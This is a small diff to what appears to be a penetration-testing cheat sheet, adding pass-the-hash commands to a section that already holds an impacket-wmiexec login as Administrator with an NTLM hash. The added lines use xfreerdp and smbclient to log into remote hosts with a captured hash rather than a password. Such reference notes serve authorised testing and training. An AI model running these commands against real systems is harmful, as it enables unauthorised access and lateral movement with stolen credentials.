@@ -4231,6 +4231,8 @@ Enter-PSSession 1
 
 ```c
 impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>
+xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard
+smbclient \\\\<RHOST>\\<SMB-Path> -U <USERNAME> --pw-nt-hash <hash>
 ```
 
 ###### Overpass the Hash
